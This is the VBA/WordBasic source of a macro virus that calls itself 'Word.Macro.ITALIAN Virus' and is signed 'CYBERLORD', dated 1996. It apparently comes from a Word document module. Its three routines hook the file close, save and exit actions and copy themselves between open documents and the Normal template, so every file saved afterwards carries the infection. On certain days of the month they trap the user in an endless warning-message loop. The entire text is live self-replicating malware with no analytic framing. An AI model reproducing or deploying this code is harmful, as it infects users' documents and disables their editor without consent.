   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "FileChiudi"

   Public Sub MAIN()
   Dim Giorno
   Dim Nome$
   On Error GoTo -1: On Error GoTo Fine
   Giorno = WordBasic.Day(WordBasic.Now())
   If Giorno = 7 Then GoTo Attivo
   If Giorno = 13 Then GoTo Attivo
   If Giorno = 17 Then GoTo Attivo
   If Giorno = 31 Then GoTo Attivo
   GoTo NonAttivo
   Attivo:
   WordBasic.MsgBox "Your PC is infected by" + Chr(13) + "Word.Macro.ITALIAN Virus" + Chr(13) + "Written Jan,1996.", "C Y B E R L O R D !!", 16
   GoTo Attivo
   NonAttivo:
   Nome$ = WordBasic.[FileName$]()
   WordBasic.MacroCopy Nome$ + ":FileMacro", "Normal:FileSalva", 1
   WordBasic.MacroCopy Nome$ + ":FileChiudi", "Normal:WordMacro1", 1
   WordBasic.MacroCopy Nome$ + ":FileEsci", "Normal:WordMacro2", 1
   WordBasic.FileClose
   Fine:
   End Sub

   Attribute VB_Name = "FileMacro"

   Public Sub MAIN()
   Dim Giorno
   On Error GoTo -1: On Error GoTo Fine
   Giorno = WordBasic.Day(WordBasic.Now())
   If Giorno = 7 Then GoTo Attivo
   If Giorno = 13 Then GoTo Attivo
   If Giorno = 17 Then GoTo Attivo
   If Giorno = 31 Then GoTo Attivo
   GoTo NonAttivo
   Attivo:
   WordBasic.MsgBox "Your PC is infected by" + Chr(13) + "Word.Macro.ITALIAN Virus" + Chr(13) + "Written Jan,1996.", "C Y B E R L O R D !!", 16
   GoTo Attivo
   NonAttivo:
   WordBasic.FileSaveAs Name:=WordBasic.[FileName$](), Format:=1
   WordBasic.MacroCopy "Normal:FileSalva", WordBasic.[FileName$]() + ":FileMacro", 1
   WordBasic.MacroCopy "Normal:WordMacro1", WordBasic.[FileName$]() + ":FileChiudi", 1
   WordBasic.MacroCopy "Normal:WordMacro2", WordBasic.[FileName$]() + ":FileEsci", 1
   WordBasic.FileSave
   Fine:
   End Sub

   Attribute VB_Name = "FileEsci"

   Public Sub MAIN()
   Dim Giorno
   Dim Nome$
   On Error GoTo -1: On Error GoTo Fine
   Giorno = WordBasic.Day(WordBasic.Now())
   If Giorno = 7 Then GoTo Attivo
   If Giorno = 13 Then GoTo Attivo
   If Giorno = 17 Then GoTo Attivo
   If Giorno = 31 Then GoTo Attivo
   GoTo NonAttivo
   Attivo:
   WordBasic.MsgBox "Your PC is infected by" + Chr(13) + "Word.Macro.ITALIAN Virus" + Chr(13) + "Written Jan,1996.", "C Y B E R L O R D !!", 16
   GoTo Attivo
   NonAttivo:
   Nome$ = WordBasic.[FileName$]()
   WordBasic.MacroCopy Nome$ + ":FileMacro", "Normal:FileSalva", 1
   WordBasic.MacroCopy Nome$ + ":FileChiudi", "Normal:WordMacro1", 1
   WordBasic.MacroCopy Nome$ + ":FileEsci", "Normal:WordMacro2", 1
   WordBasic.FileExit
   Fine:
   End Sub
